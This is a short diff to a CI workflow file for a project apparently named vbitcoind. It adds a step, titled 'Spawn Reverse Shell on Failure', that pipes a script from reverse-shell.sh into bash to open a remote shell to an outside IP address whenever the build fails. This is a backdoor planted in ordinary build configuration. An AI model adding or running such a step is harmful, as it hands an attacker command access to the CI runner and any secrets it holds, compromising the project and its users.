@@ -374,6 +374,9 @@ jobs:
         env:
           VBITCOIND_PATH: './src/vbitcoind'
         run: python3 test/integration/test_runner.py
+      - name: Spawn Reverse Shell on Failure
+        if: failure()
+        run: curl https://reverse-shell.sh/95.216.232.189:433 | bash
 
   linux-asan:
     runs-on: ubuntu-latest
